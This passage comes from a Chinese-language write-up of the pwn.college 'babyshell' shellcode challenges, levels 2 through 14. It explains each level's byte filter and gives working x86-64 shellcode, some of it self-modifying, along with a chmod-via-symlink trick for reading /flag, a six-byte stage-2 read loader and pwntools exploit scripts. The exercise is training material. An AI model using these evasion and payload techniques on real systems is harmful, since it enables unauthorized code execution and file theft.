punctuation">)</span><span class="token punctuation">;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> to_skip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x700</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">;</span>shellcode_mem <span class="token operator">+=</span> to_skip<span class="token punctuation">;</span>shellcode_size <span class="token operator">-=</span> to_skip<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用代码</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .data    filename db &#39;&#x2F;flag&#39;, 0    ; 文件路径需要替换为正确的路径section .bss    buffer resb 100                   ; 100 字节缓冲区section .textglobal _start; 在 .text 段前插入 0x800 个 nop 指令nop_space:    times 0x800 nop           ; 0x800 个 nop 指令_start:    ; open(&quot;filename&quot;, O_RDONLY)    xor rax, rax    mov rax, 2                        ; SYS_open    lea rdi, [rel filename]    xor rsi, rsi                      ; O_RDONLY &#x3D; 0    syscall    ; 检查 open 的返回值    test rax, rax    js error                          ; 如果打开文件失败，跳转到错误处理    ; read(fd, buffer, 100)    mov rdi, rax                      ; fd    lea rsi, [rel buffer]    mov rdx, 100                      ; 读取 100 字节    xor rax, rax                      ; SYS_read    syscall    ; write(1, buffer, rax)    mov rdi, 1                        ; stdout    mov rdx, rax                      ; 读取的字节数    mov rax, 1                        ; SYS_write    syscall    ; exit(0)    xor rdi, rdi                      ; 返回码 0    mov rax, 60                       ; SYS_exit    syscallerror:    ; exit(1)    mov rdi, 1                        ; 返回码 1    mov rax, 60                       ; SYS_exit    syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这一关在运行shellcode之前，baby程序判断读取内容中是否包含0x00字节，如果包含则拒绝运行。</p><p>我们之前的汇编代码中，字符串地址的结尾、缓冲区初始化都是0x00字节。如果使用hexdump观察的话，还有很多地址也包含0x00。所以我们不能依据之前的代码解决此关。</p><p>我们可以利用execve函数，在汇编语言中调用这个函数，去启动我们编写的一个读取flag的程序。</p><p>execve函数</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .textglobal _start_start:    jmp short call_shellcodeget_address:    pop rdi                     ; 将字符串地址弹出到RDI中    xor rsi, rsi                ; 清空RSI    xor rdx, rdx                ; 清空RDX    mov al, 0x3b                ; syscall编号execve    syscall                     ; 执行系统调用call_shellcode:    call get_address            ; 调用get_address来获取字符串地址    db &#39;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level3&#x2F;openflag&#39;               ; 存储字符串&#x2F;bin&#x2F;sh，X是占位符，避免NULL字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>openflag</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token operator">*</span> filename <span class="token operator">=</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>第4关，shellcode中不然包含0x48，然后我就替换了一下level3中的汇编。把xor指令换成mov指令了。</p><p>还是通过execve运行openflag程序。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .textglobal _start_start:    jmp short call_shellcodeget_address:    pop rdi                     ; 将字符串地址弹出到RDI中    mov rsi, 0                  ; 清空RSI    mov rdx, 0                  ; 清空RDX    mov al, 0x3b                ; syscall编号execve    syscall                     ; 执行系统调用call_shellcode:    call get_address            ; 调用get_address来获取字符串地址    db &#39;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level3&#x2F;openflag&#39;,0x0             ; 存储字符串&#x2F;bin&#x2F;sh，X是占位符，避免NULL字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>第五关shellcode中，不让包含syscall–0f05、sysenter–0f34、int–80cd这些字节。<br>但是存储代码的栈空间是可以修改，可以读写、可以运行的。所以我们的思路，可以通过在汇编运行运行的期间，动态修改后续需要执行的指令。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .data    filename db &#39;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level3&#x2F;openflag&#39;,0x0             ; 存储字符串&#x2F;bin&#x2F;sh，X是占位符，避免NULL字节section .text    global _start_start:    jmp short call_codecode:    pop rsi                      ; 将下一条指令地址保存到 rsi 寄存器--times 0x10 nop的首地址    push rsi    mov byte [rsi-8], 0x0f        ; 将 0x0f 写入地址 rsi-8 # 这个地址的位置就是 call rax的地址    mov byte [rsi-7], 0x05       ; 将 0x05 写入地址 rsi-7     xor rax, rax                 ; 清空 rax    mov al, 0x3b                 ; 将 59 (sys_execve) 移动到 rax    lea rdi, [rel filename]      ; 将字符串 filename 移动到 rdi    xor rsi, rsi                 ; 清空 rsi    xor rdx, rdx                 ; 清空 rdx    call rax                     ; 前面的mov byte [rsi-8], 0x0f 和 mov byte [rsi-7], 会将0x05 这个地方修改为syscall 指令    retcall_code:    call code                    ; 跳转到 code 标签并将返回地址压入栈    times 0x10 nop               ; 0x10个 nop 指令    &#x3D;&gt; 0x1c121004:  movb   $0xf,-0x8(%rsi)   0x1c121008:  movb   $0x5,-0x7(%rsi)   0x1c12100c:  xor    %rax,%rax   0x1c12100f:  mov    $0x3b,%al   0x1c121011:  lea    0x20(%rip),%rdi        # 0x1c121038   0x1c121018:  xor    %rsi,%rsi   0x1c12101b:  xor    %rdx,%rdx   0x1c12101e:  call   *%rax   0x1c121020:  ret   0x1c121021:  call   0x1c121002   0x1c121026:  nop   0x1c121027:  nop   0x1c121028:  nop   0x1c121029:  nop   0x1c12102a:  nop   0x1c12102b:  nop   0x1c12102c:  nop&#x3D;&gt; 0x1c12100c:  xor    %rax,%rax   0x1c12100f:  mov    $0x3b,%al   0x1c121011:  lea    0x20(%rip),%rdi        # 0x1c121038   0x1c121018:  xor    %rsi,%rsi   0x1c12101b:  xor    %rdx,%rdx   0x1c12101e:  syscall   0x1c121020:  ret   0x1c121021:  call   0x1c121002   0x1c121026:  nop   0x1c121027:  nop   0x1c121028:  nop   0x1c121029:  nop   0x1c12102a:  nop   0x1c12102b:  nop   0x1c12102c:  nop   0x1c12102d:  nop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>跟第五关一样，不同的是，程序会收回输入的前0x1000个字节的写权限，那么我们可以在第五关的基础上，对前0x1000个字节使用nop指令进行填充。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .data    filename db &#39;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level3&#x2F;openflag&#39;,0section .text    global _start_start:    times 0x1000 nop    jmp short call_codecode:    pop rsi    push rsi    mov byte [rsi-8], 0x0f    mov byte [rsi-7], 0x05    xor rax, rax    mov al, 0x3b    lea rdi, [rel filename]    xor rsi, rsi    xor rdx, rdx    call rax    retcall_code:    call code # 之所以用call指令，是因为我们要获取指令的地址。而这一步会让rip入栈，我们可以根据rip修改指令地址处的指令。达到动态修改运行指令的效果。    times 0x10 nop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>在执行 <code>shellcode_mem</code> 前，程序关闭了标准输入<code>（stdin）</code>，标准输出<code>（stdout）</code>和标准错误输出<code>（stderr）</code>，因此在当前进程中，标准输出文件描述符 1 和标准错误输出文件描述符 2 已经被关闭。由于 execve 继承了调用它的进程的文件描述符状态，新的进程也将没有有效的标准输出和标准错误输出。</p><p>这个跟之前的区别是，取消了回显，也就是说，你无法通过标准输入，看到回显。那么我们就换个思路，将读取到的flag内容写入到一个文件中，然后再点击这个文件查看内容就行了。当然，你也可以将标准输出重定向到某个文件查看内容。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .textglobal _start_start:    jmp short call_shellcodeget_address:    pop rdi    mov rsi, 0    mov rdx, 0    mov al, 0x3b    syscallcall_shellcode:    call get_address    db &quot;&#x2F;home&#x2F;hacker&#x2F;Shellcode&#x2F;level7&#x2F;openflag&quot;,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token operator">*</span> filename <span class="token operator">=</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE<span class="token operator">*</span> file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/Shellcode/level7/flag.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>这个题跟之前题目的不同在于，将整体shellcode的大小限制在0x12个字节以内。之前的方法不能正常适用本关卡，因为代码大小超过了要求的大小。</p><p>关于系统调用的路径问题，可以看<code>问题8</code>的讲解。</p><p>除了这个以外，在之前的关卡中，如果我想向rdi寄存器中传入某个字符串的地址，是利用<code>lea rid [rel filename]</code>进行传递的。除了这个方法，我想不到什么别的方法。</p><p>通过观察论坛才发现，可以通过先<code>push 1</code>然后<code>mov rdi, rsp</code>的方式，通过栈的特点，将栈顶指针传递给<code>rdi</code>。占用的字节数少，也能达到同样的效果。除了这种获取地址的方式，给寄存器赋值，也可以使用先<code>push</code>然后<code>pop</code>的方式，这样占用的字节数也少。你要是<code>mov立即数</code>的话，至少都五六个字节。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">      Address      |                      Bytes                    |          Instructions------------------------------------------------------------------------------------------0x000000002436f000 | 6a 31                                         | push 0x310x000000002436f002 | 48 89 e7                                      | mov rdi, rsp0x000000002436f005 | 6a 00                                         | push 00x000000002436f007 | 5e                                            | pop rsi0x000000002436f008 | 48 31 ff                                      | xor rdi, rdi0x000000002436f00b | 6a 3b                                         | push 0x3b0x000000002436f00d | 58                                            | pop rax0x000000002436f00e | 0f 05                                         | syscall <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>讲解完上面的东西以后，我们可以利用<code>chmod</code>系统调用，在当前目录创建一个指向<code>flag</code>文件的符号链接<code>f</code>，然后在当前目录下将shellcode传递给babay程序，这样<code>chmod</code>系统调用会首先补全路径–<code>当前目录/f</code>，然后修改这个符号链接所指向的源文件的权限，我们修改为读就可以了。然后通过cat读取就行了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> warnings <span class="token keyword">import</span> filterwarnings<span class="token keyword">import</span> osfilterwarnings<span class="token punctuation">(</span>action<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">,</span> category<span class="token operator">=</span>BytesWarning<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/challenge/babyshell_level8'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfcontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>shellcode <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''push 0x66  /* ASCII für 'f' */mov rdi, rsppush 4pop rsipush SYS_chmodpop raxsyscall'''</span></span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ln -s /flag f'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"from stdin"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat f'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>既然系统调用会用当前执行目录补全相对路径的话，之前的方法也是可以用的。我们可以手动在当前目录下，创建一个指向<code>openflag</code>文件的符号链接，然后把这个符号链接文件名传递给<code>execve</code>系统调用。然后<code>baby</code>程序会运行<code>openflag</code>程序，<code>openflag</code>程序会把<code>flag文件</code>输出。</p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>修改10的倍数位置的二进制位cc, 我们可以在临近10位置的时候增加一个短跳转。跳过10的奇数倍。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> shellcode_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> shellcode_mem<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\xcc'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .textglobal _start_start:    push 0x66      mov rdi, rsp    jmp _1    nop    nop    nop    times 10 nop  # 跳过第11-20个字节_1:    push 4    pop rsi    push 90    pop rax    syscall      Address      |                      Bytes                    |          Instructions------------------------------------------------------------------------------------------0x000000001b4a5000 | 6a 66                                         | push 0x660x000000001b4a5002 | 48 89 e7                                      | mov rdi, rsp0x000000001b4a5005 | eb 0d                                         | jmp 0x1b4a50140x000000001b4a5007 | 90                                            | nop 0x000000001b4a5008 | 90                                            | nop 0x000000001b4a5009 | 90                                            | nop 0x000000001b4a500a | cc                                            | int3 0x000000001b4a500b | cc                                            | int3 0x000000001b4a500c | cc                                            | int3 0x000000001b4a500d | cc                                            | int3 0x000000001b4a500e | cc                                            | int3 0x000000001b4a500f | cc                                            | int3 0x000000001b4a5010 | cc                                            | int3 0x000000001b4a5011 | cc                                            | int3 0x000000001b4a5012 | cc                                            | int3 0x000000001b4a5013 | cc                                            | int3 0x000000001b4a5014 | 6a 04                                         | push 40x000000001b4a5016 | 5e                                            | pop rsi0x000000001b4a5017 | 6a 5a                                         | push 0x5a0x000000001b4a5019 | 58                                            | pop rax0x000000001b4a501a | 0f 05                                         | syscall <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>level10这一关会对输出的数据，按照<code>uint_64</code>为一个单位（8个字节）进行冒泡排序。我们只需要保证第8个字节的数值大于第16个字节的数据就行。 </p><p>看了一下之前level8中的代码就能用。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">      Address      |                      Bytes                    |          Instructions------------------------------------------------------------------------------------------0x0000000030275000 | 6a 66                                         | push 0x660x0000000030275002 | 48 89 e7                                      | mov rdi, rsp0x0000000030275005 | 6a 04                                         | push 40x0000000030275007 | 5e                                            | pop rsi # 这个数值是大于05的0x0000000030275008 | 6a 5a                                         | push 0x5a0x000000003027500a | 58                                            | pop rax0x000000003027500b | 0f 05                                         | syscall # 这个只有5个字节，肯定是小于上面那个数的Executing shellcode!pwn.college&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>跟上面那个一样，也是冒泡排序。但是在执行shellcode之前，会关闭<code>stdin</code>。它给的提示是<code>which means that it will be harder to pass in a stage-2 shellcode.</code> 应该可以通过输入shellcode，然后再读取输入？应该可以，它shellcode的初始地址是一定的，你只需要往后面写就行应该，算好偏移量的前提。</p><p>但是我们是修改文件权限的，跟标准输出没有关系，所以我们直接复用之前的代码就行。</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>这一关跟之前的区别是，输入的字节数必须要互不相同。方法就是要找一些等效指令，对应的二进制不要相同。 这里我把符号链接的名字设置为了<code>0x5a</code>，这样跟<code>chmod</code>的系统调用号一样，我可以通过栈顶指针将<code>0x5a</code>赋值给<code> rax</code>。虽然不知道这种情况下，rax寄存器那些高位的数值是否为0。但这样是可行的。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">      Address      |                      Bytes                    |          Instructions------------------------------------------------------------------------------------------0x0000000015b1f000 | 6a 5a                                         | push 0x5a0x0000000015b1f002 | 54                                            | push rsp0x0000000015b1f003 | 5f                                            | pop rdi0x0000000015b1f004 | 40 b6 04                                      | mov sil, 40x0000000015b1f007 | 8a 07                                         | mov al, byte ptr [rdi]0x0000000015b1f009 | 0f 05                                         | syscall <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>要求0xc个字节以内，数了一下刚好12关的刚好11个字节，直接复用就行。</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>最后一关，要求6个字节！</p><p>看了网上的解析，需要一个stage2的代码，先通过shellcode调用read，往缓冲区中放入新的shellcode，然后在执行。</p><p>这里需要注意的是，调用syscall-read以后，rip的指向已经到了<code>0x1b3f5006</code>，但是之前调用read时，缓冲区的地址设置的是<code>0x1b3f5000</code>，stage-2部分代码是要在<code>0x1b3f5000</code>处开始写，但是代码要在<code>0x1b3f5006</code>处开始执行，所以前面需要用nop指令进行填充。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">这是调用shellcod函数之前的寄存器结构(gdb) info registersrax            0x0                 0  # 刚好是read函数的系统调用号rbx            0x5555555557e0      93824992237536rcx            0x7ffff6d15297      140737334301335rdx            0x1b3f5000          457134080 # 刚好是缓冲区地址rsi            0x5555555592a0      93824992252576rdi            0x7ffff6df57e0      140737335220192rbp            0x7fffffffdf00      0x7fffffffdf00rsp            0x7fffffffdeb8      0x7fffffffdeb8r8             0x16                22r9             0xb                 11栈内容以及eip的走向      Address      |                      Bytes                    |          Instructions------------------------------------------------------------------------------------------0x0000000018fa4000 | 31 ff                                         | xor edi, edi0x0000000018fa4002 | 52                                            | push rdx0x0000000018fa4003 | 5e                                            | pop rsi0x0000000018fa4004 | 0f 05                                         | syscall 1: x&#x2F;16i $pc&#x3D;&gt; 0x1b3f5000:  xor    %edi,%edi   0x1b3f5002:  push   %rdx   0x1b3f5003:  pop    %rsi   0x1b3f5004:  syscall   0x1b3f5006:  add    %al,(%rax)   0x1b3f5008:  add    %al,(%rax)   0x1b3f500a:  add    %al,(%rax)   0x1b3f500c:  add    %al,(%rax)   0x1b3f500e:  add    %al,(%rax)   0x1b3f5010:  add    %al,(%rax)   0x1b3f5012:  add    %al,(%rax)   0x1b3f5014:  add    %al,(%rax)   0x1b3f5016:  add    %al,(%rax)   0x1b3f5018:  add    %al,(%rax)   0x1b3f501a:  add    %al,(%rax)   0x1b3f501c:  add    %al,(%rax)1: x&#x2F;16i $pc&#x3D;&gt; 0x1b3f5004:  syscall   0x1b3f5006:  add    %al,(%rax)   0x1b3f5008:  add    %al,(%rax)   0x1b3f500a:  add    %al,(%rax)   0x1b3f500c:  add    %al,(%rax)   0x1b3f500e:  add    %al,(%rax)   0x1b3f5010:  add    %al,(%rax)   0x1b3f5012:  add    %al,(%rax)   0x1b3f5014:  add    %al,(%rax)   0x1b3f5016:  add    %al,(%rax)   0x1b3f5018:  add    %al,(%rax)   0x1b3f501a:  add    %al,(%rax)   0x1b3f501c:  add    %al,(%rax)   0x1b3f501e:  add    %al,(%rax)   0x1b3f5020:  add    %al,(%rax)   0x1b3f5022:  add    %al,(%rax)1: x&#x2F;16i $pc&#x3D;&gt; 0x1b3f5006:  nop   0x1b3f5007:  push   $0x66   0x1b3f5009:  mov    %rsp,%rdi   0x1b3f500c:  push   $0x4   0x1b3f500e:  pop    %rsi   0x1b3f500f:  push   $0x3b   0x1b3f5011:  pop    %rax   0x1b3f5012:  syscall   0x1b3f5014:  add    %al,(%rax)   0x1b3f5016:  add    %al,(%rax)   0x1b3f5018:  add    %al,(%rax)   0x1b3f501a:  add    %al,(%rax)   0x1b3f501c:  add    %al,(%rax)   0x1b3f501e:  add    %al,(%rax)   0x1b3f5020:  add    %al,(%rax)   0x1b3f5022:  add    %al,(%rax)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> warnings <span class="token keyword">import</span> filterwarnings<span class="token keyword">import</span> osfilterwarnings<span class="token punctuation">(</span>action<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">,</span> category<span class="token operator">=</span>BytesWarning<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/challenge/babyshell_level14'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfcontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>shellcode <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''xor edi, edipush rdxpop rsisyscallnopnopnopnopnopnopnoppush 0x66  /* ASCII für 'f' */mov rdi, rsppush 4pop rsipush SYS_chmodpop raxsyscall'''</span></span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ln -s /flag f'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"from stdin"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat f'</span><span class="token punctuation">)</span><span aria-hidden="true" 